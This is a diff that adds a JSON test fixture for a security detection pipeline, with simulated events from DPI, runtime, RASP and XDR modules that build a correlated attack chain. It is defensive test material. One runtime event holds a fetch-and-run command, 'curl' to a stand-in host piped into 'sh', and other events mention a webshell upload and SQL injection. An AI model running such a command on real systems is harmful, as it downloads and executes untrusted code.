@@ -1,0 +1,15 @@
+{
+  "prefix": "lyfixture",
+  "chain_id": "lyfixture-chain-001",
+  "agent_id": "lyfixture-agent-01",
+  "host_id": "lyfixture-host-01",
+  "events": [
+    { "id": "lyfixture-benign-001", "stream": "flows:semantic", "source_module": "dpi", "event_type": "health_check", "severity": "low", "timestamp": "2026-05-13T10:00:00Z", "src_ip": "10.10.0.10", "dst_ip": "10.10.0.20", "domain": "internal.lyflow.local", "message": "benign API health traffic" },
+    { "id": "lyfixture-domain-001", "stream": "flows:semantic", "source_module": "dpi", "event_type": "suspicious_domain", "severity": "medium", "timestamp": "2026-05-13T10:01:00Z", "src_ip": "10.10.0.10", "domain": "suspicious.example.test", "message": "suspicious domain beacon" },
+    { "id": "lyfixture-login-001", "stream": "events:xdr", "source_module": "runtime", "event_type": "login_anomaly", "severity": "high", "timestamp": "2026-05-13T10:02:00Z", "agent_id": "lyfixture-agent-01", "host_id": "lyfixture-host-01", "chain_id": "lyfixture-chain-001", "message": "failed password burst for admin" },
+    { "id": "lyfixture-upload-001", "stream": "events:xdr", "source_module": "dpi", "event_type": "suspicious_upload", "severity": "high", "timestamp": "2026-05-13T10:03:00Z", "agent_id": "lyfixture-agent-01", "host_id": "lyfixture-host-01", "chain_id": "lyfixture-chain-001", "message": "multipart upload webshell.php followed by /admin access" },
+    { "id": "lyfixture-runtime-001", "stream": "alerts:runtime", "source_module": "runtime", "event_type": "runtime_suspicious_process", "severity": "critical", "timestamp": "2026-05-13T10:04:00Z", "agent_id": "lyfixture-agent-01", "host_id": "lyfixture-host-01", "chain_id": "lyfixture-chain-001", "process": "bash -c curl http://suspicious.example.test/p.sh | sh", "message": "suspicious process execution" },
+    { "id": "lyfixture-rasp-001", "stream": "alerts:rasp", "source_module": "rasp", "event_type": "rasp_sqli", "severity": "critical", "timestamp": "2026-05-13T10:05:00Z", "agent_id": "lyfixture-agent-01", "host_id": "lyfixture-host-01", "chain_id": "lyfixture-chain-001", "attack_type": "sql_injection", "raw_reference": "fixtures/architecture/evidence/rasp-sqli.json", "message": "union select against /login" },
+    { "id": "lyfixture-xdr-001", "stream": "alerts:xdr", "source_module": "xdr", "event_type": "multi_stage_attack_chain", "severity": "critical", "timestamp": "2026-05-13T10:06:00Z", "agent_id": "lyfixture-agent-01", "host_id": "lyfixture-host-01", "chain_id": "lyfixture-chain-001", "message": "DPI Runtime RASP correlated attack chain" }
+  ]
+}
